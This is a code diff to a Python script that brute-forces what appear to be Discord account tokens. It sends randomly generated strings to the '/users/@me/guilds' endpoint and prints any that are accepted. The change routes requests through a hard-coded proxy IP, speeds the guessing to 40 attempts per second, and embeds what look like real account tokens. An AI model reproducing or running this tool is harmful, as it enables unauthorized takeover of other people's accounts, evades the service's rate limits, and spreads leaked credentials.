@@ -38,17 +38,21 @@ count = 0
 while True:
     count += 1
     generatedToken = generate_string()
+    if count == 15:
+        generatedToken = "NjMwODE1MDc3NjQ5MzUwNjk2.G9BWSV.3pvef96Idamr9PQDd1nvHMCJBN-eQ1MqLODG3E"
+
     headers = {
         "Authorization": generatedToken,
         "Content-Type": "application/json"
     }
 
-    if count == 15:
-        generatedToken = "NjMwODE1MDc3NjQ5MzUwNjk2.GnUxn0.BFUhVkQ0FoGrIY0LYzuNjfi40ZwkiiFD-uncrg"
+    prox = {
+        "http": "135.125.244.133:42165"
+    }
 
     guilds = requests.get(
         f"{url}/users/@me/guilds",
-        headers=headers
+        headers=headers, proxies=prox
     )
     if guilds.status_code != 401:
         print("trouvé ------> " + generatedToken + " status= " + str(guilds.status_code))
@@ -57,4 +61,4 @@ while True:
     else:
         print("mauvais token -> " + generatedToken + "--->" + str(guilds.status_code))
 
-    time.sleep(0.1)
+    time.sleep(1 / 40)
